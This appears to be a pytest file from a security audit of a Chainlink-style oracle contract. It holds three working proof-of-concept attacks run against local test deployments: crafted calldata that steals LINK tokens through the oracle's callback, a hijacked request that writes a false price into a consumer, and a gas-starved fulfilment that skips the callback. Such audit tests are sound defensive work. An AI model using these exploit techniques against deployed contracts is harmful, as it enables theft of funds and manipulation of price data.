# Demonstration of various attacks found within the report


def test_attack_can_steal_oracle_tokens(
        oracle_deploy,
        w3,
        accounts,
        get_logs_for_event,
        get_logs):
    """
    Transfers link tokens and steals them back via malicious request data.
    """
    (link, oracle, _, _) = oracle_deploy()

    function_selector = w3.sha3(
            text="requestData(address,uint256,uint256,bytes32,address,bytes4,bytes32,bytes)").hex()[2:10]

    transfer_function_selector = w3.sha3(
             text="transfer(address,uint256)").hex()[2:10]

    sender = "00" * 32              # Leave Empty - 32 bytes
    amount = "00" * 32              # Leave Empty - 32 bytes
    version = "0" * 63 + "1"        # Version of 1 - 32 bytes
    specId = "0" * 61 + "A9E"       # Random data - 32 bytes
    callbackAddress = "0" * 24 + link.address[2:] # Pad address to 32 bytes
    callbackFunctionId = transfer_function_selector + "0"*56 # Pad to 32 bytes
    externalId = "0" * 24 + accounts[1][2:] # Beneficiary Address - 32 bytes
    data_location = "0" * 61 + "100"      # Location of data, hex 100 - 32 bytes
    data_length = "0" * 63 + "1"          # Length of data unimportant, let's say 1
    data = "FF" + ("0" * 62)              # Random 1 byte data, 255

    calldata = function_selector \
               + sender \
               + amount \
               + version \
               + specId \
               + callbackAddress \
               + callbackFunctionId \
               + externalId \
               + data_location \
               + data_length \
               + data

    # Send request to Oracle along with 300 Link tokens
    tx = link.functions.transferAndCall(
            oracle.address,
            300,  # amount of LINK to send
            calldata).transact({'from': accounts[0]})
    eventArgs = get_logs_for_event(oracle.events.RunRequest, tx)[0]['args']

    # Print output of event
    print("Sender: {}".format(eventArgs['requester']))
    print("Amount: {}".format(eventArgs['amount']))
    print("Version: {}".format(eventArgs['version']))
    print("SpecId: {}".format(eventArgs['specId'].hex()))
    print("InternalId: {}".format(eventArgs['internalId']))
    print("Data: {}".format(eventArgs['data']))

    internal_id = eventArgs['internalId']

    print('Acc0: {}'.format(link.functions.balanceOf(accounts[0]).call()))
    print('Acc1: {}'.format(link.functions.balanceOf(accounts[1]).call()))

    # Oracle fulfills the request
    # Data is 300 in hex
    oracle.functions.fulfillData(
            internal_id,
            ('0' * 61) + '12c').transact({'from': accounts[0]})

    print('Acc0 Balance: {}'
          .format(link.functions.balanceOf(accounts[0]).call()))
    print('Acc1 Balance: {}'
          .format(link.functions.balanceOf(accounts[1]).call()))

    # Assert that account 1 has stolen the 300 tokens
    assert link.functions.balanceOf(accounts[1]).call() == 300, "Money did not transfer"


def test_attack_can_hijack_request(
        oracle_deploy,
        basic_consumer_deploy,
        chainlinked_test_deploy,
        w3,
        accounts,
        get_logs_for_event,
        get_logs):
    """
    Build a requester, A that makes a request. Have a requester B, make a
    request which fulfils A's request.
    """
    # Deploy the link token and an oracle
    (link, oracle, _, _) = oracle_deploy()
    # Deploy a basic consumer - legitimate contract using chainlink
    specId = "00" + "A9E"*10  # random 32 byte specId
    (consumer, _) = basic_consumer_deploy(link.address, oracle.address, specId)
    # Deploy another chainlinked contract. We use the CHainlinkedTest contract
    # which gives us the ability to make requests that have custom variables,
    # specifically we can specify our own callback address
    (malicious_requester, _) = chainlinked_test_deploy(link.address, oracle.address)

    # Give both consumer and malicious_requester some link tokens
    link.functions.transfer(consumer.address, int(1e20)).transact({'from': accounts[0]})
    link.functions.transfer(malicious_requester.address, int(1e20)).transact({'from': accounts[0]})

    # Standard consumer makes a request
    tx = consumer.functions.requestEthereumPrice("USD").transact({'from': accounts[1]})
    internal_id1 = get_logs_for_event(oracle.events.RunRequest, tx)[0]['args']['internalId']

    # malicious requester sees this, and also makes a request
    callback_address = consumer.address  # want to hijack the request
    function_signature = "fulfill(bytes32,bytes32)"  # function sig of consumer callback
    data = "What is 5 + 5, obtain from wolfram alpha"  # poor example of malicious request
    tokens_spent = 10

    # make the call
    tx = malicious_requester.functions.publicRequestRun(
                                                    specId,
                                                    callback_address,
                                                    function_signature,
                                                    data,
                                                    tokens_spent).transact({'from':accounts[2]})

    internal_id2 = get_logs_for_event(oracle.events.RunRequest, tx)[0]['args']['internalId']

    #  The oracle fulfils the malicious request first
    fulfill_data = "00"*31 + "0a" # 32 byte hex representing the decimal value 10
    oracle.functions.fulfillData(internal_id2, fulfill_data).transact({'from':accounts[0]})

    # Assert that the consumer has a malicious ethereum price
    current_price = w3.toInt(consumer.functions.currentPrice().call())
    assert current_price == 10, "The consumer price \
    was not hijacked"

    # Oracle then fulfils the legitimate request
    fulfill_data = "00"*31 + "ff" # 32 byte hex representing the decimal value 255
    oracle.functions.fulfillData(internal_id1, w3.toBytes(0xff)).transact({'from':accounts[0]})

    # Assert that the call fails and does not update the price to the correct price
    current_price = w3.toInt(consumer.functions.currentPrice().call())
    assert current_price == 10, "The consumer price \
    should not have been updated"

def test_attack_oracle_fulfill_no_callback(
        oracle_deploy,
        basic_consumer_deploy,
        w3,
        accounts,
        get_logs_for_event,
        get_receipt):
    """
    Oracle cheats by fulfilling with gas that only changes their state but not
    the callback contracts. We use the basic consumer as an example.
    """
    # Deploy the link token and an oracle
    (link, oracle, _, _) = oracle_deploy()
    # Deploy a basic consumer - legitimate contract using chainlink
    specId = "00" + "A9E"*10  # random 32 byte specId
    (consumer, _) = basic_consumer_deploy(link.address, oracle.address, specId)

    # Give the consumer some link tokens
    link.functions.transfer(consumer.address, int(1e20)).transact({'from': accounts[0]})

    # Standard consumer makes a request
    tx = consumer.functions.requestEthereumPrice("USD").transact({'from': accounts[1]})
    internal_id1 = get_logs_for_event(oracle.events.RunRequest, tx)[0]['args']['internalId']

    #  The oracle fulfils the request, without calling the callback
    fulfill_data = "00"*31 + "0a" # 32 byte hex representing the decimal value 10
    tx = oracle.functions.fulfillData(internal_id1,
    fulfill_data).transact({'from':accounts[0], 'gas': 52000})
    receipt = get_receipt(tx)
    print(tx.hex())
    print('Gas used in transaction: {}'.format(receipt['cumulativeGasUsed']))

    # Assert that the consumers price was not updated, due to lack of gas
    current_price = w3.toInt(consumer.functions.currentPrice().call())
    assert current_price != 10, "The consumer price updated unexpectedly"
